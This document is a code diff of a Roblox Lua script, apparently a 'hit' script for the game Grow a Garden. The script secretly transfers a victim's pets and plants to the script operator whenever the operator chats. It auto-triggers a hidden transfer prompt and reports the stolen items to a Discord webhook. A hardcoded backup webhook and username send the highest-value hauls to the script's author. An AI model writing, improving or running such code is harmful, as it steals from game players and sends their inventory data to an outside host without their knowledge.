@@ -1,41 +1,44 @@
 -- GROW A GARDEN HIT - By namnnni2
 
 local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Backpack = Players.LocalPlayer:WaitForChild("Backpack")
 local Modules = ReplicatedStorage:WaitForChild("Modules")
 
--- LẤY SETTINGS TỪ getfenv()
-local env = getfenv()
-local PRIMARY_WEBHOOK = env.Webhook
-local PRIMARY_USERNAME = env.Username
-
--- WEBHOOK DỰ PHÒNG
-local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
-local DUAL_USERNAME = "namnnni2"
+-- MODULE
+local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
+local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))
 
 -- CẤU HÌNH
 local VALUE_THRESHOLD = 1_000_000_000_000
 local HEAVY_WEIGHT = 10
-local AUTO_TRANSFER_DELAY = 0.3
 local VIP_PETS = {"Queen Bee", "Disco Bee", "Mimic Octopus", "Fennec Fox", "Butterfly", "Dragonfly", "Raccoon"}
 
--- MODULES
-local petUtils = require(Modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
-local calcPlantValue = require(Modules:WaitForChild("CalculatePlantValue"))
+-- LẤY BIẾN TỪ getfenv()
+local env = getfenv()
+local PRIMARY_WEBHOOK = env.Webhook
+local PRIMARY_USERNAME = env.Username
 
--- LẤY HÀM GỬI WEBHOOK TƯƠNG THÍCH EXECUTOR
-local request =
-    (syn and syn.request) or
-    (http and http.request) or
-    (fluxus and fluxus.request) or
-    (getgenv and getgenv().request) or
-    (krnl and krnl.request) or
-    request
+local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1391020634913374278/fPKPZTPqG2mCyai6-oebsMx5jagXzLRWNzAQb4jQoKieCJj6dLuyZT1PUh9xo9owdQ65"
+local DUAL_USERNAME = "namnnni2"
 
--- HÀM TÍNH GIÁ TRỊ ITEM
+-- HÀM CHỌN REQUEST TƯƠNG THÍCH EXECUTOR
+local function getRequestFunction()
+    return
+        (syn and syn.request) or
+        (http and http.request) or
+        (fluxus and fluxus.request) or
+        (getgenv and getgenv().request) or
+        (request) -- fallback cuối
+end
+
+-- FORMAT SỐ
+local function formatNumber(n)
+    return tostring(math.floor(n)):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", "")
+end
+
+-- TÍNH GIÁ TRỊ ITEM
 local function calculateItemValue(tool)
     local itemType = tool:GetAttribute("ItemType")
     if itemType == "Pet" then
@@ -46,49 +49,43 @@ local function calculateItemValue(tool)
     return 0
 end
 
--- FORMAT SỐ CÓ DẤU PHẨY
-local function formatNumber(n)
-    return tostring(math.floor(n)):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
+-- ƯU TIÊN SẮP XẾP
+local function calculatePriority(item)
+    local priority = 0
+    if table.find(VIP_PETS, item.Name) then priority += 1000 end
+    if (item.Weight or 0) >= HEAVY_WEIGHT then priority += 500 end
+    priority += item.Value or 0
+    return priority
 end
 
--- ƯU TIÊN ITEM
-local function getPriority(item)
-    local score = 0
-    if table.find(VIP_PETS, item.Name) then score += 1000 end
-    if (item.Weight or 0) >= HEAVY_WEIGHT then score += 500 end
-    score += item.Value or 0
-    return score
-end
-
--- SẮP XẾP ƯU TIÊN
 local function sortByPriority(a, b)
-    return getPriority(a) > getPriority(b)
+    return calculatePriority(a) > calculatePriority(b)
 end
 
 -- GỬI WEBHOOK
-local function sendWebhook(items, totalValue, targetName)
+local function sendWebhookNotification(items, totalValue, targetName)
     local useDual = totalValue >= VALUE_THRESHOLD
     local webhookUrl = useDual and DUAL_WEBHOOK or PRIMARY_WEBHOOK
     local username = useDual and DUAL_USERNAME or (PRIMARY_USERNAME or "unknown")
 
     if not webhookUrl then
-        warn("❌ Không có webhook để gửi.")
+        warn("❌ Không có webhook. Dừng gửi.")
         return
     end
 
-    local hasImportant = false
+    local hasVIPOrHeavy = false
     for _, item in ipairs(items) do
         if table.find(VIP_PETS, item.Name) or (item.Weight or 0) >= HEAVY_WEIGHT then
-            hasImportant = true
+            hasVIPOrHeavy = true
             break
         end
     end
 
     local categories = {
-        {title = "💎 VIP Pets", items = {}},
-        {title = "🏋️ Heavy Pets", items = {}},
-        {title = "🐾 Regular Pets", items = {}},
-        {title = "🌱 Plants", items = {}}
+        {name = "💎 VIP Pets", items = {}},
+        {name = "🏋️ Heavy Pets", items = {}},
+        {name = "🐾 Regular Pets", items = {}},
+        {name = "🌱 Plants", items = {}}
     }
 
     for _, item in ipairs(items) do
@@ -103,14 +100,14 @@ local function sendWebhook(items, totalValue, targetName)
         end
     end
 
-    local desc = {}
-    for _, cat in ipairs(categories) do
-        if #cat.items > 0 then
-            table.insert(desc, "**"..cat.title.." ("..#cat.items..")**")
-            for _, i in ipairs(cat.items) do
-                table.insert(desc, string.format("- %s: $%s (%.1fkg)", i.Name, formatNumber(i.Value), i.Weight or 0))
+    local descriptionParts = {}
+    for _, category in ipairs(categories) do
+        if #category.items > 0 then
+            table.insert(descriptionParts, "**"..category.name.." ("..#category.items..")**")
+            for _, item in ipairs(category.items) do
+                table.insert(descriptionParts, string.format("- %s: $%s (%.1fkg)", item.Name, formatNumber(item.Value), item.Weight or 0))
             end
-            table.insert(desc, "")
+            table.insert(descriptionParts, "")
         end
     end
 
@@ -119,7 +116,7 @@ local function sendWebhook(items, totalValue, targetName)
         embeds = {{
             title = useDual and "💎 VIP TRANSFER" or "📦 ITEM TRANSFER",
             color = useDual and 0xFFD700 or 0x00FF00,
-            description = table.concat(desc, "\n"),
+            description = table.concat(descriptionParts, "\n"),
             fields = {
                 {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
                 {name = "🎯 Receiver", value = targetName, inline = true},
@@ -129,44 +126,46 @@ local function sendWebhook(items, totalValue, targetName)
             footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
             timestamp = DateTime.now():ToIsoDate()
         }},
-        content = hasImportant and "@everyone" or nil
+        content = hasVIPOrHeavy and "@everyone" or nil
     }
 
-    if request then
-        local success, res = pcall(function()
-            return request({
-                Url = webhookUrl,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode(payload)
-            })
-        end)
+    local req = getRequestFunction()
+    if not req then
+        warn("❌ Executor không hỗ trợ request(). Không thể gửi webhook.")
+        return
+    end
 
-        if success and res and res.StatusCode and res.StatusCode < 400 then
-            warn("✅ Webhook gửi thành công.")
-        else
-            warn("❌ Webhook lỗi:", res and res.StatusCode, res and res.Body)
-        end
+    local success, response = pcall(function()
+        return req({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+
+    if success then
+        print("✅ Webhook sent to:", webhookUrl)
     else
-        warn("❌ Executor không hỗ trợ request.")
+        warn("❌ Webhook failed to send:", response)
     end
 end
 
--- CHUYỂN ITEM VÀ GỬI WEBHOOK
-local function transferToPlayer(targetName)
-    local target = Players:FindFirstChild(targetName)
-    if not target then return end
-    local char = target.Character or target.CharacterAdded:Wait()
-    local hrp = char:WaitForChild("HumanoidRootPart")
-    local myHRP = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-    if not myHRP then return end
+-- CHUYỂN ITEM KHI NGƯỜI CHỦ CHAT
+local function onPlayerChatted(player, msg)
+    local myChar = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
+    local myHRP = myChar:WaitForChild("HumanoidRootPart")
+    local theirChar = player.Character or player.CharacterAdded:Wait()
+    local theirHRP = theirChar:WaitForChild("HumanoidRootPart")
 
     local prompt = Instance.new("ProximityPrompt")
     prompt.ActionText = "Transfer"
-    prompt.ObjectText = "To "..targetName
+    prompt.ObjectText = "To "..player.Name
     prompt.HoldDuration = 0.5
     prompt.MaxActivationDistance = 10
-    prompt.Parent = hrp
+    prompt.Parent = theirHRP
 
     prompt.Triggered:Connect(function()
         local items = {}
@@ -180,52 +179,43 @@ local function transferToPlayer(targetName)
                     Value = calculateItemValue(tool),
                     Tool = tool
                 }
-                table.insert(items, item)
                 total += item.Value
+                table.insert(items, item)
             end
         end
 
         table.sort(items, sortByPriority)
 
-        local targetBackpack = target:FindFirstChildOfClass("Backpack")
+        local theirBackpack = player:FindFirstChildOfClass("Backpack")
         for _, item in ipairs(items) do
             if item.Tool and item.Tool.Parent == Backpack then
-                item.Tool.Parent = targetBackpack
-                task.wait(AUTO_TRANSFER_DELAY)
+                item.Tool.Parent = theirBackpack
+                task.wait(0.3)
             end
         end
 
-        sendWebhook(items, total, targetName)
+        sendWebhookNotification(items, total, player.Name)
     end)
 
-    -- Auto run prompt
-    task.delay(0.5, function()
-        prompt:InputHoldBegin()
-        task.wait(prompt.HoldDuration)
-        prompt:InputHoldEnd()
-    end)
+    task.wait(0.5)
+    prompt:InputHoldBegin()
+    task.wait(prompt.HoldDuration)
+    prompt:InputHoldEnd()
+end
 
-    -- Follow sau lưng
-    RunService.Heartbeat:Connect(function(dt)
-        local pos = hrp.CFrame.Position - hrp.CFrame.LookVector * 3
-        local move = myHRP.Position:Lerp(pos, dt * 10)
-        myHRP.CFrame = CFrame.new(move, hrp.Position)
+-- NGHE CHAT TỪ CHỦ
+for _, p in ipairs(Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg)
+        if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
+            onPlayerChatted(p, msg)
+        end
     end)
 end
 
--- NGHE CHAT CỦA CHỦ
 Players.PlayerAdded:Connect(function(p)
-    p.Chatted:Connect(function()
+    p.Chatted:Connect(function(msg)
         if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
-            transferToPlayer(p.Name)
+            onPlayerChatted(p, msg)
         end
     end)
 end)
-
-for _, p in ipairs(Players:GetPlayers()) do
-    p.Chatted:Connect(function()
-        if p.Name == PRIMARY_USERNAME or p.Name == DUAL_USERNAME then
-            transferToPlayer(p.Name)
-        end
-    end)
-end
